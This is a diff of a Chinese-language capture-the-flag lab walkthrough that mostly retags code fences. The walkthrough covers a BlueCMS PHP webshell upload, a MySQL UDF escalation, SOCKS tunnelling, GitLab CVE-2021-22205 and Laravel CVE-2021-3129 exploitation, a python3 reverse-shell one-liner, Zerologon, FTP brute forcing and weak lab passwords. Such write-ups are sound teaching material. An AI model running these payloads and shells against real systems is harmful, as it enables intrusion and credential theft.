@@ -17,7 +17,7 @@ slug: "gyb-2023-su-wu"
 bluecms后台：http://172.30.38.150/admin/
 账号密码 admin admin666
 后台系统管理->模板管理处获编译htm文件，修改为php，burp包如下
-```
+```http
 POST /admin/tpl_manage.php HTTP/1.1
 Host: 172.30.38.150
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -33,11 +33,11 @@ Upgrade-Insecure-Requests: 1
 tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&tpl_name=../shell.php&act=do_edit
 ```
 获取权限，蚁剑连接，根目录下有flag.txt
-```
+```text
 flag{9130db0c-c67b-4cee-a9a1-a79c34efc079}
 ```
 同时找/var/www/html/data/config.php看到了关于数据库账号密码相关信息
-```
+```php
 $dbhost   = "127.0.0.1"; //dmz-db
 $dbname   = "bluecms";
 $dbuser   = "root";
@@ -49,7 +49,7 @@ $dbpass   = "root"; // root-gzdb123
 根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客 https://sqlsec.com/udf/
 上复制dll的exp下来，然后执行命令获取权限，整体过程如下
 hex太大 这里缩写为0x4d5a900003....
-```
+```text
 
 MySQL [(none)]> select @@plugin_dir;
 +----------------------------------------------------+
@@ -80,7 +80,7 @@ MySQL [(none)]> select sys_eval('type C:\\users\\Administrator\\Desktop\\flag.tx
 
 ## 2、内网区
 DMZ区拿下了一台linux 一台windows ，选择用linux挂代理
-```
+```text
 linux:
 ./gost -L=socks5://:7777
 ./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30
@@ -93,7 +93,7 @@ gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
 先fscan扫描
 `./fscan -h 192.168.0.0/16`
 网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器
-```
+```text
 192.168.20.19:8080 open
 192.168.20.19:22 open
 [*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None
@@ -103,7 +103,7 @@ gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
 ```
 网站找gitlab前台rce漏洞，分析了一下，cve-2021-22205可用，github找一个exp打，这里很蛋疼，这个poc是无回显的，而且gitlab不太方便做权限维持（不是php写的），尝试反弹shell，但是内网区是不通本地的ip，只有DMZ区通。
 所以我使用的方法是
-```
+```text
 1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell
 这个dmz区反弹一直报错，最后使用python3反弹的
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.10",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
@@ -112,7 +112,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 
 获取了git的权限，flag在根目录 
-```
+```bash
 git@60783d084846:~/gitlab$ cat /flag.txt
 flag{b10785ca-a4ff-4cb9-a6d5-50351c248ee3}
 ```
@@ -142,7 +142,7 @@ NetInfo:
 发现存在Zerologon经典漏洞，CVE-2020-1472
 先挂上192.168.10.10上的代理，github找一个exp,对着网站复现。
 拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下
-```
+```python
 proxychains4 python3 cve-2020-1472-exploit.py DC 192.168.20.15                                 1 ⨯
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -201,7 +201,7 @@ flag{bcbdb15f-fad8-4f18-b9d5-c5ff397bf275}
 
 ## 3、核心内网区
 总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产
-```
+```bash
 git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt
 ./f -np -h 192.168.30.0/24 -o 30.txt
 
@@ -250,7 +250,7 @@ laravel经典漏洞 `/_ignition/execute-solution debug rce CVE-2021-3129`
 这个靶场的这个题是今年网鼎决赛-渗透赛道的原题，本人刚好参加并且网鼎决赛现场做出。
 ，思路为`任意文件读获取log位置，debug打反序列化rce`
 任意文件读的接口如下 /api/file
-```
+```text
 一步步读框架文件，读到配置文件
 http://192.168.30.13/api/file?filename=/var/www/html/laravel/config/logging.php
 找到日志文件位置logs/tmplog/laravel_log.log
@@ -301,14 +301,14 @@ for i in range(0,10):
 ```
 
 用超级弱口令导入用户名ftpuser，密码passwd.txt爆破
-```
+```text
 192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#
 ```
 连接发现有个报错`500 Illegal PORT command.
 425 Use PORT or PASV first.`
 网上找了一下为啥，尝试`quote PASV` 改成被动模式，用windows的资源管理器打开发现可以复制出来了
 获取到flag
-```
+```text
 flag{5923d77e-0765-4701-bc2d-fc1188fe953b}
 ```
 
@@ -319,7 +319,7 @@ flag{5923d77e-0765-4701-bc2d-fc1188fe953b}
 
 ### Tomcat-RCE
 
-```
+```text
 弱口令
 
 admin:admin123!@#,有可能记错
